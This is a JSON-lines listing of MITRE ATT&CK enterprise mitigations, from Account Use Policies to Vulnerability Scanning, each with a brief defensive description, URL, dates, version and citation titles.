{"ID":"M1036","name":"Account Use Policies","description":"Configure features related to account use like login attempt lockouts, specific login times, etc.","url":"https://attack.mitre.org/mitigations/M1036","created":"11 June 2019","last modified":"21 October 2022","version":"1.0","relationship citations":"(Citation: Microsoft Common Conditional Access Policies)"}
{"ID":"M1015","name":"Active Directory Configuration","description":"Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.","url":"https://attack.mitre.org/mitigations/M1015","created":"06 June 2019","last modified":"29 May 2020","version":"1.1","relationship citations":"(Citation: ADSecurity Kerberos and KRBTGT),(Citation: Microsoft MS14-025),(Citation: Microsoft Replication ACL),(Citation: Microsoft Trust Considerations Nov 2014),(Citation: Microsoft Protected Users Security Group),(Citation: Microsoft SID Filtering Quarantining Jan 2009),(Citation: AdSecurity DCSync Sept 2015),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Mandiant Defend UNC2452 White Paper),(Citation: SpecterOps Certified Pre Owned),(Citation: STIG krbtgt reset),(Citation: Microsoft Netdom Trust Sept 2012),(Citation: ADSecurity Mimikatz DCSync)"}
{"ID":"M1049","name":"Antivirus/Antimalware","description":"Use signatures or heuristics to detect malicious software.","url":"https://attack.mitre.org/mitigations/M1049","created":"11 June 2019","last modified":"31 March 2020","version":"1.1","relationship citations":"(Citation: Chkrootkit Main),(Citation: Anomali Template Injection MAR 2018),(Citation: Microsoft AMSI June 2015),(Citation: SourceForge rkhunter)"}
{"ID":"M1013","name":"Application Developer Guidance","description":"This mitigation describes any guidance or training given to developers of applications to avoid introducing security weaknesses that an adversary may be able to take advantage of.","url":"https://attack.mitre.org/mitigations/M1013","created":"25 October 2017","last modified":"17 October 2018","version":"1.0","relationship citations":"(Citation: Apple Developer Doco Hardened Runtime),(Citation: Apple App Security Overview),(Citation: FireEye DLL Side-Loading)"}
{"ID":"M1048","name":"Application Isolation and Sandboxing","description":"Restrict execution of code to a virtual environment on or in transit to an endpoint system.","url":"https://attack.mitre.org/mitigations/M1048","created":"11 June 2019","last modified":"31 March 2020","version":"1.1","relationship citations":"(Citation: Windows Blogs Microsoft Edge Sandbox),(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: Kubernetes Hardening Guide),(Citation: Microsoft Protected View)"}
{"ID":"M1047","name":"Audit","description":"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","url":"https://attack.mitre.org/mitigations/M1047","created":"11 June 2019","last modified":"31 March 2023","version":"1.2","relationship citations":"(Citation: Github UACMe),(Citation: Microsoft Sxstrace),(Citation: Microsoft Manage Mail Flow Rules 2023),(Citation: Microsoft Preauthentication Jul 2012),(Citation: GitHub Certify),(Citation: MagicWeb),(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2),(Citation: ADSecurity Finding Passwords in SYSVOL),(Citation: Microsoft CreateProcess),(Citation: Amazon S3 Security, 2019),(Citation: Cisco IOS Software Integrity Assurance - Image File Verification),(Citation: GitHub Bloodhound),(Citation: Microsoft Get-InboxRule),(Citation: Powersploit),(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019),(Citation: Secureworks - AT.exe Scheduled Task),(Citation: FireEye ADFS),(Citation: Cisco IOS Software Integrity Assurance - Change Control),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Vulnerability and Exploit Detector),(Citation: SpecterOps Certified Pre Owned),(Citation: Mandiant Azure AD Backdoors),(Citation: Kifarunix - Task Scheduling in Linux),(Citation: GitHub PSPKIAudit),(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity),(Citation: Kubernetes Hardening Guide),(Citation: Pfammatter - Hidden Inbox Rules)"}
{"ID":"M1040","name":"Behavior Prevention on Endpoint","description":"Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.","url":"https://attack.mitre.org/mitigations/M1040","created":"11 June 2019","last modified":"11 June 2019","version":"1.0","relationship citations":"(Citation: Malicious Driver Reporting Center),(Citation: Microsoft ASR Obfuscation),(Citation: Microsoft_rec_block_rules),(Citation: win10_asr),(Citation: Microsoft driver block rules),(Citation: Enigma Reviving DDE Jan 2018),(Citation: Microsoft ASR Nov 2017)"}
{"ID":"M1046","name":"Boot Integrity","description":"Use secure methods to boot a system and verify the integrity of the operating system and loading mechanisms.","url":"https://attack.mitre.org/mitigations/M1046","created":"11 June 2019","last modified":"19 May 2020","version":"1.0","relationship citations":"(Citation: ESET LoJax Sept 2018),(Citation: Intel Hardware-based Security Technologies),(Citation: Microsoft TESTSIGNING Feb 2021),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: TCG Trusted Platform Module),(Citation: TechNet Secure Boot Process)"}
{"ID":"M1045","name":"Code Signing","description":"Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.","url":"https://attack.mitre.org/mitigations/M1045","created":"11 June 2019","last modified":"20 May 2020","version":"1.1","relationship citations":"(Citation: Content trust in Azure Container Registry),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: applescript signing),(Citation: Content trust in Docker)"}
{"ID":"M1043","name":"Credential Access Protection","description":"Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.","url":"https://attack.mitre.org/mitigations/M1043","created":"11 June 2019","last modified":"21 October 2022","version":"1.1","relationship citations":"(Citation: TechNet Credential Guard),(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management),(Citation: GitHub SHB Credential Guard),(Citation: Microsoft Enable Cred Guard April 2017),(Citation: Microsoft Credential Guard April 2017)"}
{"ID":"M1053","name":"Data Backup","description":"Take and store data backups from end user systems and critical servers. Ensure backup and storage systems are hardened and kept separate from the corporate network to prevent compromise.","url":"https://attack.mitre.org/mitigations/M1053","created":"19 July 2019","last modified":"31 March 2020","version":"1.1","relationship citations":"(Citation: Rhino S3 Ransomware Part 2),(Citation: Unit 42 Palo Alto Ransomware in Public Clouds 2022),(Citation: Ready.gov IT DRP)"}
{"ID":"M1057","name":"Data Loss Prevention","description":"Use a data loss prevention (DLP) strategy to categorize sensitive data, identify data formats indicative of personal identifiable information (PII), and restrict exfiltration of sensitive data.(Citation: PurpleSec Data Loss Prevention)","url":"https://attack.mitre.org/mitigations/M1057","created":"04 August 2021","last modified":"30 August 2021","version":"1.0","relationship citations":null}
{"ID":"M1042","name":"Disable or Remove Feature or Program","description":"Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","url":"https://attack.mitre.org/mitigations/M1042","created":"11 June 2019","last modified":"31 March 2020","version":"1.1","relationship citations":"(Citation: Microsoft Disable DCOM),(Citation: GitHub MOTW),(Citation: MRWLabs Office Persistence Add-ins),(Citation: GitHub Disable DDEAUTO Oct 2017),(Citation: Microsoft Network access Credential Manager),(Citation: Microsoft Disable Autorun),(Citation: Amazon AWS IMDS V2),(Citation: BleepingComputer DDE Disabled in Word Dec 2017),(Citation: ITSyndicate Disabling PHP functions),(Citation: Microsoft DDE Advisory Nov 2017),(Citation: Microsoft AlwaysInstallElevated 2018),(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing),(Citation: Microsoft ADV170021 Dec 2017),(Citation: Gmail Delegation),(Citation: SpecterOps Certified Pre Owned),(Citation: Microsoft Disable VBA Jan 2020),(Citation: Microsoft BEC Campaign),(Citation: Microsoft Disable Macros),(Citation: TechNet Screensaver GP),(Citation: Symantec SSH and ssh-agent),(Citation: TechNet Removable Media Control),(Citation: ADSecurity Windows Secure Baseline)"}
{"ID":"M1055","name":"Do Not Mitigate","description":"This category is to associate techniques that mitigation might increase risk of compromise and therefore mitigation is not recommended.","url":"https://attack.mitre.org/mitigations/M1055","created":"19 July 2019","last modified":"23 July 2019","version":"1.0","relationship citations":null}
{"ID":"M1041","name":"Encrypt Sensitive Information","description":"Protect sensitive information with strong encryption.","url":"https://attack.mitre.org/mitigations/M1041","created":"11 June 2019","last modified":"11 June 2019","version":"1.0","relationship citations":"(Citation: Microsoft Azure Storage Security, 2019),(Citation: Google Cloud Encryption Key Rotation),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Microsoft Primary Refresh Token),(Citation: Amazon S3 Security, 2019),(Citation: Metcalf 2015),(Citation: AdSecurity Cracking Kerberos Dec 2015),(Citation: SpecterOps Certified Pre Owned)"}
{"ID":"M1039","name":"Environment Variable Permissions","description":"Prevent modification of environment variables by unauthorized users and groups.","url":"https://attack.mitre.org/mitigations/M1039","created":"11 June 2019","last modified":"11 June 2019","version":"1.0","relationship citations":"(Citation: Securing bash history)"}
{"ID":"M1038","name":"Execution Prevention","description":"Block execution of code on a system through application control, and/or script blocking.","url":"https://attack.mitre.org/mitigations/M1038","created":"11 June 2019","last modified":"28 February 2022","version":"1.2","relationship citations":"(Citation: Microsoft PowerShell CLM),(Citation: Beechey 2010),(Citation: Microsoft Windows Defender Application Control),(Citation: Wikibooks Grsecurity),(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Microsoft WDAC),(Citation: Corio 2008),(Citation: Dormann Dangers of VHD 2019),(Citation: Default VBS macros Blocking ),(Citation: Increasing Linux kernel integrity),(Citation: Microsoft Driver Block Rules),(Citation: SANS Application Whitelisting),(Citation: Kernel.org Restrict Kernel Module),(Citation: Microsoft ISAPICGIRestriction 2016),(Citation: Windows Commands JPCERT),(Citation: Kubernetes Security Context),(Citation: Microsoft Application Lockdown),(Citation: TechNet Applocker vs SRP),(Citation: Kernel Self Protection Project),(Citation: NSA MS AppLocker),(Citation: Microsoft Using Software Restriction ),(Citation: Kubernetes Hardening Guide),(Citation: LKM loading kernel restrictions),(Citation: Technospot Chrome Extensions GP),(Citation: file_upload_attacks_pt2)"}
{"ID":"M1050","name":"Exploit Protection","description":"Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.","url":"https://attack.mitre.org/mitigations/M1050","created":"11 June 2019","last modified":"20 June 2020","version":"1.1","relationship citations":"(Citation: Windows Commands JPCERT),(Citation: TechNet Moving Beyond EMET),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008),(Citation: Microsoft Windows Defender Application Control),(Citation: Wikipedia Control Flow Integrity),(Citation: Secure Host Baseline EMET)"}
{"ID":"M1037","name":"Filter Network Traffic","description":"Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.","url":"https://attack.mitre.org/mitigations/M1037","created":"11 June 2019","last modified":"20 June 2020","version":"1.1","relationship citations":"(Citation: RedLock Instance Metadata API 2018),(Citation: Microsoft SMB Packet Signing),(Citation: Cisco ARP Poisoning Mitigation 2016),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: US-CERT APT Energy Oct 2017),(Citation: Microsoft Preventing SMB),(Citation: ntlm_relaying_kerberos_del),(Citation: US-CERT SMB Security),(Citation: Juniper DAI 2020),(Citation: Secure Ideas SMB Relay),(Citation: CERT-EU DDoS March 2017),(Citation: byt3bl33d3r NTLM Relaying)"}
{"ID":"M1035","name":"Limit Access to Resource Over Network","description":"Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.","url":"https://attack.mitre.org/mitigations/M1035","created":"11 June 2019","last modified":"09 June 2020","version":"1.0","relationship citations":"(Citation: Kubernetes API Control Access),(Citation: Microsoft AKS Azure AD 2023),(Citation: Docker Daemon Socket Protect),(Citation: Wikipedia 802.1x),(Citation: TechNet RDP Gateway),(Citation: Kubernetes Cloud Native Security)"}
{"ID":"M1034","name":"Limit Hardware Installation","description":"Block users or groups from installing or using unapproved hardware on systems, including USB devices.","url":"https://attack.mitre.org/mitigations/M1034","created":"11 June 2019","last modified":"09 June 2020","version":"1.0","relationship citations":null}
{"ID":"M1033","name":"Limit Software Installation","description":"Block users or groups from installing unapproved software.","url":"https://attack.mitre.org/mitigations/M1033","created":"11 June 2019","last modified":"11 June 2019","version":"1.0","relationship citations":null}
{"ID":"M1032","name":"Multi-factor Authentication","description":"Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.","url":"https://attack.mitre.org/mitigations/M1032","created":"10 June 2019","last modified":"21 October 2022","version":"1.0","relationship citations":"(Citation: CISA MFA PrintNightmare),(Citation: MFA Fatigue Attacks - PortSwigger),(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: AWS - IAM Console Best Practices),(Citation: Berkley Secure),(Citation: Expel IO Evil in AWS),(Citation: Microsoft Nobelium Admin Privileges),(Citation: Evilginx 2 July 2018),(Citation: Amazon S3 Security, 2019),(Citation: Microsoft - Device Registration),(Citation: Mandiant APT29 Microsoft 365 2022)"}
{"ID":"M1031","name":"Network Intrusion Prevention","description":"Use intrusion detection signatures to block traffic at network boundaries.","url":"https://attack.mitre.org/mitigations/M1031","created":"10 June 2019","last modified":"10 June 2019","version":"1.0","relationship citations":"(Citation: Akamai DGA Mitigation),(Citation: Anomali Template Injection MAR 2018),(Citation: University of Birmingham C2),(Citation: Cisco Umbrella DGA Brute Force),(Citation: Cybereason Dissecting DGAs),(Citation: US-CERT-TA18-106A),(Citation: dhcp_serv_op_events),(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)"}
{"ID":"M1030","name":"Network Segmentation","description":"Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.","url":"https://attack.mitre.org/mitigations/M1030","created":"10 June 2019","last modified":"14 May 2020","version":"1.1","relationship citations":"(Citation: TechNet Firewall Design),(Citation: NSA Spotting),(Citation: US-CERT TA17-156A SNMP Abuse 2017),(Citation: Harmj0y Domain Trusts)"}
{"ID":"M1028","name":"Operating System Configuration","description":"Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","url":"https://attack.mitre.org/mitigations/M1028","created":"06 June 2019","last modified":"31 March 2023","version":"1.2","relationship citations":"(Citation: SpectorOps Code Signing Dec 2017),(Citation: Microsoft Disable NTLM Nov 2012),(Citation: UCF STIG Elevation Account Enumeration),(Citation: TechRepublic Wireless GPO FEB 2009),(Citation: Windows RDP Sessions),(Citation: Apple Developer Doco Hardened Runtime),(Citation: reagentc_cmd),(Citation: Microsoft GPO Bluetooth FEB 2009),(Citation: Tilbury Windows Credentials),(Citation: TechNet Removable Media Control),(Citation: Seqrite DoubleExtension),(Citation: Microsoft WDigest Mit),(Citation: Microsoft BITS),(Citation: EnableMPRNotifications),(Citation: HowToGeek ShowExtension),(Citation: TechNet Server Operator Scheduled Task),(Citation: Windows Anonymous Enumeration of SAM Accounts),(Citation: TechNet RDP NLA)"}
{"ID":"M1027","name":"Password Policies","description":"Set and enforce secure password policies for accounts.","url":"https://attack.mitre.org/mitigations/M1027","created":"06 June 2019","last modified":"21 October 2022","version":"1.0","relationship citations":"(Citation: AWS - IAM Console Best Practices),(Citation: NIST 800-63-3),(Citation: store_pwd_rev_enc),(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet),(Citation: Microsoft Install Password Filter n.d),(Citation: AdSecurity Cracking Kerberos Dec 2015)"}
{"ID":"M1056","name":"Pre-compromise","description":"This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.","url":"https://attack.mitre.org/mitigations/M1056","created":"19 October 2020","last modified":"20 October 2020","version":"1.0","relationship citations":null}
{"ID":"M1026","name":"Privileged Account Management","description":"Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","url":"https://attack.mitre.org/mitigations/M1026","created":"06 June 2019","last modified":"31 March 2020","version":"1.1","relationship citations":"(Citation: TechNet Least Privilege),(Citation: AWS Setting Up Run Command),(Citation: Microsoft Remote Use of Local),(Citation: FireEye WMI 2015),(Citation: TechNet Scheduling Priority),(Citation: Microsoft Requests for Azure AD Roles in Privileged Identity Management),(Citation: TechNet Credential Theft),(Citation: MagicWeb),(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Microsoft Securing Privileged Access),(Citation: Netspi PowerShell Execution Policy Bypass),(Citation: Protecting Microsoft 365 From On-Premises Attacks),(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Microsoft COM ACL),(Citation: Tilbury Windows Credentials),(Citation: Mandiant Azure Run Command 2021),(Citation: Microsoft Azure security baseline for Azure Active Directory),(Citation: Microsoft runas),(Citation: Kubernetes Admission Controllers),(Citation: Kubernetes Service Accounts),(Citation: ADSecurity AD Kerberos Attacks),(Citation: Microsoft Process Wide Com Keys),(Citation: Microsoft System Wide Com Keys),(Citation: FireEye ADFS),(Citation: CyberArk Labs Safe Mode 2016),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token),(Citation: Microsoft Security Alerts for Azure AD Roles),(Citation: Kubernetes Hardening Guide),(Citation: Microsoft PS JEA),(Citation: AdSecurity Cracking Kerberos Dec 2015)"}
{"ID":"M1025","name":"Privileged Process Integrity","description":"Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.","url":"https://attack.mitre.org/mitigations/M1025","created":"06 June 2019","last modified":"20 May 2020","version":"1.1","relationship citations":"(Citation: Microsoft Configure LSA),(Citation: Microsoft LSA),(Citation: Microsoft LSA Protection Mar 2014),(Citation: Graeber 2014)"}
{"ID":"M1029","name":"Remote Data Storage","description":"Use remote security log and sensitive file storage where access can be controlled better to prevent exposure of intrusion detection log data or sensitive information.","url":"https://attack.mitre.org/mitigations/M1029","created":"06 June 2019","last modified":"06 June 2019","version":"1.0","relationship citations":"(Citation: Ready.gov IT DRP)"}
{"ID":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access by setting directory and file permissions that are not specific to users or privileged accounts.","url":"https://attack.mitre.org/mitigations/M1022","created":"06 June 2019","last modified":"20 May 2020","version":"1.1","relationship citations":"(Citation: Microsoft W32Time May 2017),(Citation: Microsoft ETW May 2018),(Citation: piazza launch agent mitigation),(Citation: win_xml_evt_log),(Citation: InsiderThreat NTFS EA Oct 2017),(Citation: cisco_deploy_rsa_keys),(Citation: create_sym_links)"}
{"ID":"M1044","name":"Restrict Library Loading","description":"Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.","url":"https://attack.mitre.org/mitigations/M1044","created":"11 June 2019","last modified":"11 June 2019","version":"1.0","relationship citations":"(Citation: Microsoft DLL Security),(Citation: Microsoft More information about DLL),(Citation: Microsoft Dynamic Link Library Search Order)"}
{"ID":"M1024","name":"Restrict Registry Permissions","description":"Restrict the ability to modify certain hives or keys in the Windows Registry.","url":"https://attack.mitre.org/mitigations/M1024","created":"06 June 2019","last modified":"31 March 2023","version":"1.1","relationship citations":"(Citation: Microsoft W32Time May 2017),(Citation: Microsoft System Services Fundamentals),(Citation: def_ev_win_event_logging)"}
{"ID":"M1021","name":"Restrict Web-Based Content","description":"Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","url":"https://attack.mitre.org/mitigations/M1021","created":"06 June 2019","last modified":"06 June 2019","version":"1.0","relationship citations":"(Citation: Microsoft Azure AD Admin Consent)"}
{"ID":"M1020","name":"SSL/TLS Inspection","description":"Break and inspect SSL/TLS sessions to look at encrypted web traffic for adversary activity.","url":"https://attack.mitre.org/mitigations/M1020","created":"06 June 2019","last modified":"06 June 2019","version":"1.0","relationship citations":null}
{"ID":"M1054","name":"Software Configuration","description":"Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.","url":"https://attack.mitre.org/mitigations/M1054","created":"19 July 2019","last modified":"31 March 2020","version":"1.1","relationship citations":"(Citation: Wikipedia HPKP),(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018),(Citation: GitHub Disable DDEAUTO Oct 2017),(Citation: CloudSploit - Unused AWS Regions),(Citation: Palo Alto Office Test Sofacy),(Citation: ACSC Email Spoofing),(Citation: Microsoft Anti Spoofing),(Citation: Enigma Reviving DDE Jan 2018),(Citation: CyberArk Labs Safe Mode 2016),(Citation: Cisco Securing SNMP)"}
{"ID":"M1019","name":"Threat Intelligence Program","description":"A threat intelligence program helps an organization generate their own threat intelligence information and track trends to inform defensive priorities to mitigate risk.","url":"https://attack.mitre.org/mitigations/M1019","created":"06 June 2019","last modified":"06 June 2019","version":"1.0","relationship citations":null}
{"ID":"M1051","name":"Update Software","description":"Perform regular software updates to mitigate exploitation risk.","url":"https://attack.mitre.org/mitigations/M1051","created":"11 June 2019","last modified":"07 July 2020","version":"1.0","relationship citations":"(Citation: SensePost Outlook Home Page),(Citation: SensePost Outlook Forms),(Citation: NSA Spotting),(Citation: Github UACMe),(Citation: ADSecurity Finding Passwords in SYSVOL),(Citation: MS14-025),(Citation: Cisco Blog Legacy Device Attacks)"}
{"ID":"M1052","name":"User Account Control","description":"Configure Windows User Account Control to mitigate risk of adversaries obtaining elevated process access.","url":"https://attack.mitre.org/mitigations/M1052","created":"11 June 2019","last modified":"31 March 2020","version":"1.1","relationship citations":"(Citation: Executable Installers are Vulnerable),(Citation: GitHub IAD Secure Host Baseline UAC Filtering)"}
{"ID":"M1018","name":"User Account Management","description":"Manage the creation, modification, use, and permissions associated to user accounts.","url":"https://attack.mitre.org/mitigations/M1018","created":"06 June 2019","last modified":"20 May 2020","version":"1.1","relationship citations":"(Citation: Crowdstrike AWS User Federation Persistence),(Citation: Microsoft ETW May 2018),(Citation: Kubernetes RBAC),(Citation: Amazon  AWS Temporary Security Credentials),(Citation: NSA and ASD Detect and Prevent Web Shells 2020),(Citation: Office 365 Partner Relationships),(Citation: Symantec BITS May 2007),(Citation: UCF STIG Symbolic Links),(Citation: Microsoft WMI Filters),(Citation: Mandiant M-Trends 2020),(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Expel IO Evil in AWS),(Citation: Amazon S3 Security, 2019),(Citation: Microsoft Azure Storage Security, 2019),(Citation: Apple TN2459 Kernel Extensions),(Citation: Wald0 Guide to GPOs),(Citation: Microsoft SolarWinds Customer Guidance),(Citation: Microsoft GPO Security Filtering),(Citation: Kubernetes Hardening Guide),(Citation: MDMProfileConfigMacOS)"}
{"ID":"M1017","name":"User Training","description":"Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","url":"https://attack.mitre.org/mitigations/M1017","created":"06 June 2019","last modified":"21 October 2020","version":"1.2","relationship citations":"(Citation: Re-Open windows on Mac)"}
{"ID":"M1016","name":"Vulnerability Scanning","description":"Vulnerability scanning is used to find potentially exploitable software vulnerabilities to remediate them.","url":"https://attack.mitre.org/mitigations/M1016","created":"06 June 2019","last modified":"14 July 2020","version":"1.1","relationship citations":"(Citation: OWASP Top 10)"}
